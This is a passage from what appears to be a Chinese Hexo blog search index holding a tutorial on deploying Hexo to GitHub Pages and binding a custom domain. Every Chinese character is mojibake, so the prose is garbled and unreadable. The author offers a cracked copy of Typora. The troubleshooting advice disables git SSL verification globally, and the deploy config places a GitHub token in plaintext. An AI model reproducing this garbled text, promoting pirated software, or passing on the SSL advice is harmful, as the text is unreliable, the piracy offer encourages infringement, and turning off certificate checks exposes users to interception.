--save</code></p><p>2.ä½¿ç”¨å›½å†…é•œåƒæº</p><ul><li><p>å›½å†…è®¿é—® npm å®˜æ–¹æºå¯èƒ½ä¼šæœ‰é€Ÿåº¦è¾ƒæ…¢æˆ–è€…ä¸ç¨³å®šçš„é—®é¢˜ï¼Œå¯ä»¥åˆ‡æ¢åˆ°å›½å†…é•œåƒæºï¼Œå¦‚æ·˜å®é•œåƒï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">npm config set registry https:<span class="hljs-comment">//registry.npmmirror.com/</span><br></code></pre></td></tr></table></figure></li></ul><p>ä¹‹åå†å°è¯•é‡æ–°å®‰è£…ä¾èµ–ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>3.é…ç½® Hexo éƒ¨ç½²åˆ° GitHub Pages</p><p>æ‰“å¼€ä½ çš„ Hexo é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶ï¼Œæ‰¾åˆ°æˆ–æ·»åŠ  <code>deploy</code> é…ç½®éƒ¨åˆ†ï¼ŒæŒ‰ç…§ä»¥ä¸‹ç¤ºä¾‹è¿›è¡Œé…ç½®ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">  type:</span> git<br><span class="hljs-symbol">  repository:</span> https:<span class="hljs-comment">//github.com/ä½ çš„ç”¨æˆ·å/ä½ çš„ä»“åº“å.github.io.git</span><br><span class="hljs-symbol">  branch:</span> main<br><span class="hljs-symbol">  token:</span> ä½ çš„GitHubä¸ªäººè®¿é—®ä»¤ç‰Œ<br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼š</p><ul><li><code>repository</code>ï¼šå°†æ­¤é¡¹æ›¿æ¢ä¸ºä½  GitHub Pages ä»“åº“çš„åœ°å€ï¼Œæ ¼å¼é€šå¸¸ä¸º <code>https://github.com/ä½ çš„ç”¨æˆ·å/ä½ çš„ç”¨æˆ·å.github.io.git</code>ã€‚</li><li><code>branch</code>ï¼šé€šå¸¸ä¸º <code>main</code>ï¼Œä¹Ÿå¯èƒ½æ˜¯ <code>master</code>ï¼Œè§†ä½ çš„ä»“åº“é…ç½®è€Œå®šã€‚</li><li><code>token</code>ï¼šGitHub çš„ Personal access tokenï¼Œç”¨äºèº«ä»½éªŒè¯ã€‚ä½ å¯ä»¥åœ¨ GitHub çš„ <a href="https://github.com/settings/tokens">Personal access tokens</a> é¡µé¢ç”Ÿæˆä¸€ä¸ªæ–°ä»¤ç‰Œã€‚</li></ul><p><strong>ç†ç¼“å­˜å¹¶ç”Ÿæˆéƒ¨ç½²</strong></p><ul><li><p>åœ¨ç»ˆç«¯ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œæ¸…ç†ç¼“å­˜å¹¶ç”Ÿæˆé™æ€æ–‡ä»¶ï¼Œç„¶åéƒ¨ç½²åˆ° GitHubï¼š</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs verilog">hexo clean<br>hexo <span class="hljs-keyword">generate</span><br>hexo deploy<br></code></pre></td></tr></table></figure></li></ul><p><strong>æ£€æŸ¥éƒ¨ç½²</strong></p><ul><li>éƒ¨ç½²å®Œæˆåï¼Œç­‰å¾…å‡ åˆ†é’Ÿåè®¿é—® <code>https://ä½ çš„ç”¨æˆ·å.github.io</code>ï¼ŒæŸ¥çœ‹ä½ çš„åšå®¢æ˜¯å¦æˆåŠŸéƒ¨ç½²ã€‚</li></ul><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>é¦–å…ˆï¼Œåœ¨æœ¬åœ°åˆ›å»ºä¸€ç¯‡æ–°çš„æ–‡ç« ã€‚ä½ å¯ä»¥ä½¿ç”¨ Hexo æä¾›çš„å‘½ä»¤æ¥ç”Ÿæˆä¸€ç¯‡æ–°æ–‡ç« çš„æ–‡ä»¶ã€‚</p><p><code>hexo new &quot;æ–‡ç« æ ‡é¢˜&quot;</code></p><p>è¿™å°†ä¼šåœ¨ <code>source/_posts/</code> ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª <code>æˆ‘çš„æ–°æ–‡ç« .md</code> æ–‡ä»¶ã€‚</p><h3 id="åˆ›å»ºå…³äºé¡µé¢"><a href="#åˆ›å»ºå…³äºé¡µé¢" class="headerlink" title="åˆ›å»ºå…³äºé¡µé¢"></a>åˆ›å»ºå…³äºé¡µé¢</h3><p>hexo new page about</p><h3 id="é…ç½®åˆ†ç±»é¡µé¢"><a href="#é…ç½®åˆ†ç±»é¡µé¢" class="headerlink" title="é…ç½®åˆ†ç±»é¡µé¢"></a>é…ç½®åˆ†ç±»é¡µé¢</h3><p>ç¡®ä¿ <code>source/about/index.md</code> æ–‡ä»¶ä¸­æœ‰å†…å®¹ã€‚å³ä½¿æ˜¯ä¸€ä¸ªç®€å•çš„æ ‡é¢˜å’Œæ®µè½ä¹Ÿå¯ä»¥ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">title:</span> <span class="hljs-string">å…³äºæˆ‘</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2024-08-31 12:00:00</span><br><br><span class="hljs-string">è¿™é‡Œæ˜¯å…³äºé¡µé¢çš„å†…å®¹ã€‚</span><br></code></pre></td></tr></table></figure><h3 id="åˆ›å»ºåˆ†ç±»é¡µé¢"><a href="#åˆ›å»ºåˆ†ç±»é¡µé¢" class="headerlink" title="åˆ›å»ºåˆ†ç±»é¡µé¢"></a>åˆ›å»ºåˆ†ç±»é¡µé¢</h3><p>hexo new page categories</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">title</span>: å…³äºæˆ‘ <br><span class="hljs-attribute">date</span>: 2024-08-31 12:00:00 <br><span class="hljs-literal">-</span>-- è¿™é‡Œæ˜¯å…³äºé¡µé¢çš„å†…å®¹ã€‚<br></code></pre></td></tr></table></figure><h3 id="é…ç½®åˆ†ç±»é¡µé¢-1"><a href="#é…ç½®åˆ†ç±»é¡µé¢-1" class="headerlink" title="é…ç½®åˆ†ç±»é¡µé¢"></a>é…ç½®åˆ†ç±»é¡µé¢</h3><p>ç¼–è¾‘ <code>source/categories/index.md</code> æ–‡ä»¶ï¼Œç¡®ä¿å®ƒæ­£ç¡®é…ç½®ä¸ºå±•ç¤ºæ‰€æœ‰åˆ†ç±»ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">title: åˆ†ç±»<br>layout: categories<br></code></pre></td></tr></table></figure><h3 id="ç”Ÿæˆæ ‡ç­¾é¡µé¢"><a href="#ç”Ÿæˆæ ‡ç­¾é¡µé¢" class="headerlink" title="ç”Ÿæˆæ ‡ç­¾é¡µé¢"></a>ç”Ÿæˆæ ‡ç­¾é¡µé¢</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo new page tags<br></code></pre></td></tr></table></figure><h3 id="é…ç½®æ ‡ç­¾é¡µé¢"><a href="#é…ç½®æ ‡ç­¾é¡µé¢" class="headerlink" title="é…ç½®æ ‡ç­¾é¡µé¢"></a>é…ç½®æ ‡ç­¾é¡µé¢</h3><p>æ¥ä¸‹æ¥ï¼Œç¼–è¾‘ <code>source/tags/index.md</code> æ–‡ä»¶ï¼Œä»¥ç¡®ä¿å®ƒæ­£ç¡®æ˜¾ç¤ºæ ‡ç­¾åˆ—è¡¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">title: æ ‡ç­¾<br>layout: tags<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥å†™æ–‡ä»¶äº†</p><p>åªéœ€è¦æ³¨æ„å‰é¢æ˜¯åƒï¼š</p><p>title: ç»•è¿‡Disable_function<br>date: 2024-08-31 12:47:42<br>categories: CTF-web rce<br>tags: web php       è¿™æ ·çš„</p><h3 id="ä¸‰æ­¥å»ºç«‹æ³•"><a href="#ä¸‰æ­¥å»ºç«‹æ³•" class="headerlink" title="ä¸‰æ­¥å»ºç«‹æ³•"></a>ä¸‰æ­¥å»ºç«‹æ³•</h3><p>hexo clean  </p><p>hexo generate</p><p>hexo server</p><p>ç„¶ååœ¨æµè§ˆå™¨ä¸­è®¿é—® <code>http://localhost:4000/about/</code></p><p>ä»€ä¹ˆæ²¡æœ‰å¥½çš„mdç¼–è¾‘å™¨è¿˜è¦ç”¨vså’Œclionå°±outäº†ï¼Œæ‰¾æˆ‘ï¼Œç ´è§£çš„å…è´¹typoraä¸ç”¨è°¢</p><p><strong>æ£€æŸ¥ Git é…ç½®</strong><br>ç¡®ä¿ Git çš„é…ç½®æ­£ç¡®ã€‚ä½ å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ Git çš„é…ç½®ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">git<span class="hljs-built_in"> config </span>--global --<span class="hljs-built_in">get</span> http.sslVerify<br></code></pre></td></tr></table></figure><p>å¦‚æœ SSL æ ¡éªŒè¢«ç¦ç”¨ï¼Œå¯ä»¥å°è¯•å¯ç”¨å®ƒï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">git config --global http.sslVerify <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>æœ‰æ—¶ Git å¯¹ SSL è¯ä¹¦çš„å¤„ç†ä¼šæœ‰é—®é¢˜ï¼Œå¯ä»¥å°è¯•ç¦ç”¨ SSL éªŒè¯æ¥ç¡®è®¤é—®é¢˜æ˜¯å¦å‡ºåœ¨ SSL ä¸Šã€‚å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä¸´æ—¶ç¦ç”¨ SSL éªŒè¯ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">git config --global http.sslVerify <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>ç„¶åå†è¯•ä¸€æ¬¡éƒ¨ç½²ã€‚å¦‚æœè¿™èƒ½æˆåŠŸï¼Œè¯´æ˜é—®é¢˜å‡ºåœ¨ SSL è¯ä¹¦éªŒè¯ä¸Šã€‚ä½ å¯ä»¥åœ¨ç¡®è®¤é—®é¢˜åï¼Œå†è€ƒè™‘å¯ç”¨ SSL æˆ–å®‰è£…æ­£ç¡®çš„è¯ä¹¦ã€‚</p><p>è¦å°†ä½ çš„Hexoç½‘ç«™ä¸è‡ªå®šä¹‰åŸŸå ç»‘å®šï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š</p><h3 id="1-é…ç½®åŸŸåDNS"><a href="#1-é…ç½®åŸŸåDNS" class="headerlink" title="1. é…ç½®åŸŸåDNS"></a>1. <strong>é…ç½®åŸŸåDNS</strong></h3><p>é¦–å…ˆï¼Œä½ éœ€è¦åœ¨ä½ çš„åŸŸåæ³¨å†Œå•†å¤„é…ç½®DNSè®°å½•ï¼Œä»¥æŒ‡å‘GitHub Pagesçš„æœåŠ¡å™¨ã€‚</p><h4 id="æ·»åŠ Aè®°å½•ï¼ˆå¦‚æœä½¿ç”¨è£¸åŸŸåï¼‰"><a href="#æ·»åŠ Aè®°å½•ï¼ˆå¦‚æœä½¿ç”¨è£¸åŸŸåï¼‰" class="headerlink" title="æ·»åŠ Aè®°å½•ï¼ˆå¦‚æœä½¿ç”¨è£¸åŸŸåï¼‰"></a>æ·»åŠ Aè®°å½•ï¼ˆå¦‚æœä½¿ç”¨è£¸åŸŸåï¼‰</h4><ol><li><p>ç™»å½•åˆ°ä½ çš„åŸŸåæ³¨å†Œå•†çš„ç®¡ç†æ§åˆ¶å°ã€‚</p></li><li><p>æ‰¾åˆ°ä½ çš„åŸŸå <code>uertnecesshazar.top</code> çš„DNSè®¾ç½®é¡µé¢ã€‚</p></li><li><p>æ·»åŠ ä¸€æ¡Aè®°å½•ï¼š</p><ul><li><strong>ä¸»æœºåï¼ˆHostï¼‰</strong>ï¼š<code>@</code> æˆ–ç•™ç©º</li><li><strong>è®°å½•ç±»å‹ï¼ˆTypeï¼‰</strong>ï¼š<code>A</code></li><li><strong>è®°å½•å€¼ï¼ˆValueï¼‰</strong>ï¼š<code>185.199.108.153</code>, <code>185.199.109.153</code>, <code>185.199.110.153</code>, <code>185.199.111.153</code></li><li><strong>TTL</strong>ï¼šä½¿ç”¨é»˜è®¤å€¼</li></ul><p>ä½ å¯ä»¥æ·»åŠ å››æ¡Aè®°å½•ï¼Œåˆ†åˆ«æŒ‡å‘GitHub Pagesçš„IPåœ°å€ï¼Œä»¥ç¡®ä¿é«˜å¯ç”¨æ€§ã€‚</p></li></ol><h4 id="æ·»åŠ CNAMEè®°å½•ï¼ˆå¦‚æœä½¿ç”¨å¸¦wwwçš„åŸŸåï¼‰"><a href="#æ·»åŠ CNAMEè®°å½•ï¼ˆå¦‚æœä½¿ç”¨å¸¦wwwçš„åŸŸåï¼‰" class="headerlink" title="æ·»åŠ CNAMEè®°å½•ï¼ˆå¦‚æœä½¿ç”¨å¸¦wwwçš„åŸŸåï¼‰"></a>æ·»åŠ CNAMEè®°å½•ï¼ˆå¦‚æœä½¿ç”¨å¸¦wwwçš„åŸŸåï¼‰</h4><p>å¦‚æœä½ è¿˜æƒ³æ”¯æŒ <code>www.uertnecesshazar.top</code> è¿™æ ·çš„å­åŸŸåï¼Œä½ å¯ä»¥æ·»åŠ ä¸€æ¡CNAMEè®°å½•ï¼š</p><ol><li><strong>ä¸»æœºåï¼ˆHostï¼‰</strong>ï¼š<code>www</code></li><li><strong>è®°å½•ç±»å‹ï¼ˆTypeï¼‰</strong>ï¼š<code>CNAME</code></li><li><strong>è®°å½•å€¼ï¼ˆValueï¼‰</strong>ï¼š<code>theganlove.github.io</code></li><li><strong>TTL</strong>ï¼šä½¿ç”¨é»˜è®¤å€¼</li></ol><h3 id="2-é…ç½®Hexoçš„CNAMEæ–‡ä»¶"><a href="#2-é…ç½®Hexoçš„CNAMEæ–‡ä»¶" class="headerlink" title="2. é…ç½®Hexoçš„CNAMEæ–‡ä»¶"></a>2. <strong>é…ç½®Hexoçš„CNAMEæ–‡ä»¶</strong></h3><p>ä¸ºäº†è®©GitHub PagesçŸ¥é“ä½ çš„ç½‘ç«™ç»‘å®šäº†è‡ªå®šä¹‰åŸŸåï¼Œä½ éœ€è¦åœ¨Hexoé¡¹ç›®ä¸­æ·»åŠ ä¸€ä¸ª <code>CNAME</code> æ–‡ä»¶ã€‚</p><ol><li><p><strong>åˆ›å»ºCNAMEæ–‡ä»¶</strong>ï¼š</p><ul><li>åœ¨ä½ çš„ Hexo é¡¹ç›®çš„ <code>source</code> ç›®å½•ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªåä¸º <code>CNAME</code> çš„æ–‡ä»¶ï¼ˆæ— æ‰©å±•åï¼‰ã€‚</li></ul></li><li><p><strong>ç¼–è¾‘CNAMEæ–‡ä»¶</strong>ï¼š</p><ul><li><p>åœ¨ <code>CNAME</code> æ–‡ä»¶ä¸­æ·»åŠ ä½ çš„è‡ªå®šä¹‰åŸŸåï¼š</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">uertnecesshazar.<span class="hljs-built_in">top</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>ä¿å­˜æ–‡ä»¶</strong>ã€‚</p></li></ol><h3 id="3-é‡æ–°ç”Ÿæˆå’Œéƒ¨ç½²ç½‘ç«™"><a href="#3-é‡æ–°ç”Ÿæˆå’Œéƒ¨ç½²ç½‘ç«™" class="headerlink" title="3. é‡æ–°ç”Ÿæˆå’Œéƒ¨ç½²ç½‘ç«™"></a>3. <strong>é‡æ–°ç”Ÿæˆå’Œéƒ¨ç½²ç½‘ç«™</strong></h3><ol><li><p>ç”Ÿæˆé™æ€æ–‡ä»¶ï¼š</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">hexo <span class="hljs-keyword">generate</span><br></code></pre></td></tr></table></figure></li><li><p>éƒ¨ç½²åˆ°GitHub Pagesï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo deploy</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="4-ç­‰å¾…DNSç”Ÿæ•ˆ"><a href="#4-ç­‰å¾…DNSç”Ÿæ•ˆ" class="headerlink" title="4. ç­‰å¾…DNSç”Ÿæ•ˆ"></a>4. <strong>ç­‰å¾…DNSç”Ÿæ•ˆ</strong></h3><p>DNSæ›´æ”¹å¯èƒ½éœ€è¦å‡ åˆ†é’Ÿåˆ°48å°æ—¶ç”Ÿæ•ˆã€‚ä½ å¯ä»¥ä½¿ç”¨ <code>nslookup</code> æˆ– <code>dig</code> å·¥å…·æ¥æ£€æŸ¥DNSè®¾ç½®æ˜¯å¦æ­£ç¡®é…ç½®ã€‚</p><h3 id="5-è®¿é—®ä½ çš„è‡ªå®šä¹‰åŸŸå"><a href="#5-è®¿é—®ä½ çš„è‡ªå®šä¹‰åŸŸå" class="headerlink" title="5. è®¿é—®ä½ çš„è‡ªå®šä¹‰åŸŸå"></a>5. <strong>è®¿é—®ä½ çš„è‡ªå®šä¹‰åŸŸå</strong></h3><p>ä¸€æ—¦DNSç”Ÿæ•ˆï¼Œä½ åº”è¯¥å¯ä»¥é€šè¿‡ <code>http://uertnecesshazar.top</code> æˆ– <code>https://uertnecesshazar.top</code> è®¿é—®ä½ çš„ç½‘ç«™ã€‚</p><h3 id="6-é…ç½®HTTPSï¼ˆå¯é€‰ï¼‰"><a href="#6-é…ç½®HTTPSï¼ˆå¯é€‰ï¼‰" class="headerlink" title="6. é…ç½®HTTPSï¼ˆå¯é€‰ï¼‰"></a>6. <strong>é…ç½®HTTPSï¼ˆå¯é€‰ï¼‰</strong></h3><p>GitHub Pages æ”¯æŒå…è´¹çš„HTTPSè¯ä¹¦ã€‚å¦‚æœä½ ä½¿ç”¨è‡ªå®šä¹‰åŸŸåå¹¶å¸Œæœ›å¯ç”¨HTTPSï¼Œè¯·åœ¨GitHubä»“åº“çš„è®¾ç½®ä¸­å¯ç”¨HTTPSã€‚</p><ol><li>åœ¨ä½ çš„GitHubä»“åº“é¡µé¢ä¸­ï¼Œç‚¹å‡» â€œSettingsâ€ã€‚</li><li>å‘ä¸‹æ»šåŠ¨åˆ° â€œGitHub Pagesâ€ éƒ¨åˆ†ã€‚</li><li>å¦‚æœé€‰é¡¹å¯ç”¨ï¼Œå‹¾é€‰ â€œEnforce HTTPSâ€ é€‰é¡¹ã€‚</li></ol><p>è¿™å°†å¼ºåˆ¶æ‰€æœ‰ç”¨æˆ·é€šè¿‡HTTPSè®¿é—®ä½ çš„ç½‘ç«™ï¼Œç¡®ä¿æ•°æ®ä¼ è¾“çš„å®‰å…¨æ€§ã€‚</p><p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œä½ å°†æˆåŠŸå°†è‡ªå®šä¹‰åŸŸå <code>uertnecesshazar.top</code> ä¸Hexoç½‘ç«™ç»‘å®š</p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒæ­å»º</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¯å¢ƒ</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
